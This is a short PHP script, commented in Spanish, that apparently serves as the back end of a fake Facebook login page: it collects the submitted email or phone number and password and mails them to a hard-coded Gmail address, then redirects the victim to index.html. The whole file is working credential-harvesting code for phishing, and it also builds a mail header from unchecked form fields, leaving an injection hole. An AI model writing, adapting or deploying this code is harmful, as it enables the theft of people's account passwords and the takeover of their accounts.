<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $remitente = $_POST['email'];
    $destinatario = 'palacio.0820@gmail.com'; // Reemplaza con la dirección de correo a la que quieres enviar los datos del formulario
    $asunto = 'Datos del formulario de Facebook'; // Cambia el asunto si lo deseas
    
    $cuerpo = "Correo electrónico o número de teléfono: " . $_POST["email"] . "\n";
    $cuerpo .= "Contraseña: " . $_POST["password"] . "\n";

    // Puedes agregar más campos del formulario al cuerpo del mensaje según sea necesario

    $headers  = "MIME-Version: 1.0\n";
    $headers .= "Content-type: text/plain; charset=utf-8\n";
    $headers .= "X-Priority: 3\n";
    $headers .= "X-MSMail-Priority: Normal\n";
    $headers .= "X-Mailer: php\n";
    $headers .= "From: \"".$_POST['nombre']." ".$_POST['apellido']."\" <".$remitente.">\n";

    mail($destinatario, $asunto, $cuerpo, $headers);
    
    header("Location: index.html"); // Redirige al usuario después de enviar el formulario
    exit;
}
?>
